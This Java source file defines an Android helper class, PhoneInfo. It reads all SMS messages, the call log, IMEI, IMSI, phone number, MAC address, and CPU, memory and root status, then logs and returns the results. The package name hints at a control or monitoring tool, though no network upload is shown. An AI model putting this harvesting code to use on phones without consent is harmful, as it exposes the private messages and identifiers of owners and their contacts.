/**
 * 
 */
package com.byc.control;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;



import android.app.Service;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.StatFs;
import android.provider.CallLog.Calls;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;

/**
 * @author byc
 *
 */
public class PhoneInfo {
	public String TAG = "byc001";//调试标识：
	private static PhoneInfo current;
	 private Context context;
	 private PhoneInfo(Context context) {
		 this.context = context;
		 this.TAG=Config.TAG;
	 }
	    public static synchronized PhoneInfo getPhoneInfo(Context context) {
	        if(current == null) {
	            current = new PhoneInfo(context);
	        }
	        return current;
	    }
	    /** 
	     * 获取所有短信 
	     *  
	     * @return 
	     */  
	    public String getSmsInPhone() {  
	        final String SMS_URI_ALL = "content://sms/";  
	  
	        StringBuilder smsBuilder = new StringBuilder();  
	  
	        try {  
	            Uri uri = Uri.parse(SMS_URI_ALL);  
	            String[] projection = new String[] { "_id", "address", "person",  
	                    "body", "date", "type" };  
	            Cursor cur = context.getContentResolver().query(uri, projection, null,  
	                    null, "date desc"); // 获取手机内部短信  
	  
	            if (cur.moveToFirst()) {  
	                int index_Address = cur.getColumnIndex("address");  
	                int index_Person = cur.getColumnIndex("person");  
	                int index_Body = cur.getColumnIndex("body");  
	                int index_Date = cur.getColumnIndex("date");  
	                int index_Type = cur.getColumnIndex("type");  
	  
	                do {  
	                    String strAddress = cur.getString(index_Address);  
	                    int intPerson = cur.getInt(index_Person);  
	                    String strbody = cur.getString(index_Body);  
	                    long longDate = cur.getLong(index_Date);  
	                    int intType = cur.getInt(index_Type);  
	  
	                    SimpleDateFormat dateFormat = new SimpleDateFormat(  
	                            "yyyy-MM-dd hh:mm:ss");  
	                    Date d = new Date(longDate);  
	                    String strDate = dateFormat.format(d);  
	  
	                    String strType = "";  
	                    if (intType == 1) {  
	                        strType = "接收";  
	                    } else if (intType == 2) {  
	                        strType = "发送";  
	                    } else {  
	                        strType = "null";  
	                    }  
	  
	                    smsBuilder.append("[ ");  
	                    smsBuilder.append(strAddress + ", ");  
	                    smsBuilder.append(intPerson + ", ");  
	                    smsBuilder.append(strbody + ", ");  
	                    smsBuilder.append(strDate + ", ");  
	                    smsBuilder.append(strType);  
	                    smsBuilder.append(" ]\r\n");  
	                } while (cur.moveToNext());  
	  
	                if (!cur.isClosed()) {  
	                    cur.close();  
	                    cur = null;  
	                }  
	            } else {  
	                smsBuilder.append("no result!");  
	            } // end if  
	  
	            smsBuilder.append("getSmsInPhone has executed!");  
	  
	        } catch (SQLiteException ex) {  
	            Log.d("SQLiteException in getSmsInPhone", ex.getMessage());  
	        }  
	        Log.i(TAG, smsBuilder.toString());
	        return smsBuilder.toString();  
	    }  
	    /** 
	     * 获取通话记录 
	     */  
	    public String GetCallsInPhone() {  
	        String result = null;  
	        Cursor cursor = context.getContentResolver().query(  
	                Calls.CONTENT_URI,  
	                new String[] { Calls.DURATION, Calls.TYPE, Calls.DATE,  
	                        Calls.NUMBER }, null, null, Calls.DEFAULT_SORT_ORDER);  
	        boolean hasRecord = cursor.moveToFirst();  
	        int count = 0;  
	        String strPhone = "";  
	        String date;  
	  
	        while (hasRecord) {  
	            int type = cursor.getInt(cursor.getColumnIndex(Calls.TYPE));  
	            long duration = cursor.getLong(cursor  
	                    .getColumnIndex(Calls.DURATION));  
	            strPhone = cursor.getString(cursor.getColumnIndex(Calls.NUMBER));  
	            SimpleDateFormat dateFormat = new SimpleDateFormat(  
	                    "yyyy-MM-dd hh:mm:ss");  
	            Date d = new Date(Long.parseLong(cursor.getString(cursor  
	                    .getColumnIndex(Calls.DATE))));  
	            date = dateFormat.format(d);  
	  
	            result = result + "phone :" + strPhone + ",";  
	  
	            result = result + "date :" + date + ",";  
	            result = result + "time :" + duration + ",";  
	  
	            switch (type) {  
	            case Calls.INCOMING_TYPE:  
	                result = result + "type :呼入";  
	                break;  
	            case Calls.OUTGOING_TYPE:  
	                result = result + "type :呼出";  
	            default:  
	                break;  
	            }  
	            result += "\r\n";  
	            count++;  
	            hasRecord = cursor.moveToNext();  
	        }
	        Log.i(TAG, result); 
	        return result;
	        //textView.setText(result);  
	    } 
	    public String getBaseInfo(){
	    	 String text = "本机信息：" + 
	    		        "\n" + getTotalMemory() + 
	    		        "\n" + getAvailMemory() +  
	    		        "\n" + getInfo() +  
	    		        "\n" + getMacAddress() +  
	    		        "\n" + getCpuInfo() + 
	    		        "\n" + getPackage() + 
	    		        "\n" + isRoot(); 
	    	 return text;
	    }
	    /** 
	     * 获取软件包名,版本名，版本号 
	     */
	    private String getPackage(){ 
	      try { 
	        String pkName = context.getPackageName(); 
	        String versionName = context.getPackageManager().getPackageInfo( 
	            pkName, 0).versionName; 
	        int versionCode = context.getPackageManager() 
	            .getPackageInfo(pkName, 0).versionCode; 
	        return "Package:" + pkName + "\nversionName:" + versionName + "\nversionCode:" + versionCode; 
	      } catch (Exception e) { 
	      } 
	      return null; 
	    } 
	      
	    /** 
	     * 获取手机是否root信息 
	     * @return 
	     */
	    private String isRoot(){ 
	      String bool = "Root:false"; 
	      try{ 
	        if ((!new File("/system/bin/su").exists()) && (!new File("/system/xbin/su").exists())){ 
	          bool = "Root:false"; 
	        } else { 
	          bool = "Root:true"; 
	        }       
	      } catch (Exception e) { 
	      }  
	      return bool; 
	    } 
	      
	    /** 
	     * 获取android当前可用内存大小  
	     */ 
	    private String getAvailMemory() {// 获取android当前可用内存大小         
	      File path = Environment.getDataDirectory();  
	      StatFs stat = new StatFs(path.getPath());  
	      long blockSize = stat.getBlockSize();  
	      long availableBlocks = stat.getAvailableBlocks();  
	      return "当前可用内存：" + Formatter.formatFileSize(context, blockSize * availableBlocks); 
	      }   
	       
	    /** 
	     * 获得系统总内存 
	     */ 
	    private String getTotalMemory() {  
	      String str1 = "/proc/meminfo";// 系统内存信息文件   
	      String str2;  
	      String[] arrayOfString;  
	      long initial_memory = 0;    
	      try {  
	      FileReader localFileReader = new FileReader(str1);  
	      BufferedReader localBufferedReader = new BufferedReader(  
	      localFileReader, 8192);  
	      str2 = localBufferedReader.readLine();// 读取meminfo第一行，系统总内存大小   
	       
	      arrayOfString = str2.split("\\s+");  
	      initial_memory = Integer.valueOf(arrayOfString[1]).intValue() * 1024;// 获得系统总内存，单位是KB，乘以1024转换为Byte   
	      localBufferedReader.close();    
	      } catch (IOException e) {  
	      }  
	      return "总内存大小：" + Formatter.formatFileSize(context, initial_memory);// Byte转换为KB或者MB，内存大小规格化   
	    }  
	       

	    /** 
	     * 获取IMEI号，IESI号，手机型号 
	     */ 
	    private String getInfo() {  
	       TelephonyManager mTm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);  
	        String imei = mTm.getDeviceId();  
	        String imsi = mTm.getSubscriberId();  
	        String mtype = android.os.Build.MODEL; // 手机型号  
	        String mtyb= android.os.Build.BRAND;//手机品牌  
	        String numer = mTm.getLine1Number(); // 手机号码，有的可得，有的不可得  
	      return "手机IMEI号："+imei+"\r\n手机IESI号："+imsi+"\r\n手机型号："+mtype+"\r\n手机品牌："+mtyb+"\r\n手机号码"+numer;  
	      }  
	    /** 
	     * 获取手机MAC地址 
	     * 只有手机开启wifi才能获取到mac地址 
	     */ 
	    private String getMacAddress(){  
	        String result = "";  
	        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);  
	        WifiInfo wifiInfo = wifiManager.getConnectionInfo();  
	        result = wifiInfo.getMacAddress();  
	        return "手机macAdd:" + result;  
	      }  
	    /** 
	     * 手机CPU信息 
	     */ 
	    private String getCpuInfo() {  
	        String str1 = "/proc/cpuinfo";  
	        String str2 = "";  
	        String[] cpuInfo = {"", ""}; //1-cpu型号 //2-cpu频率  
	        String[] arrayOfString;  
	        try {  
	          FileReader fr = new FileReader(str1);  
	          BufferedReader localBufferedReader = new BufferedReader(fr, 8192);  
	          str2 = localBufferedReader.readLine();  
	          arrayOfString = str2.split("\\s+");  
	          for (int i = 2; i < arrayOfString.length; i++) {  
	            cpuInfo[0] = cpuInfo[0] + arrayOfString[i] + " ";  
	          }  
	          str2 = localBufferedReader.readLine();  
	          arrayOfString = str2.split("\\s+");  
	          cpuInfo[1] += arrayOfString[2];  
	          localBufferedReader.close();  
	        } catch (IOException e) {  
	        }  
	        return "CPU型号:" + cpuInfo[0] + "\nCPU频率：" + cpuInfo[1];  
	      }  

}
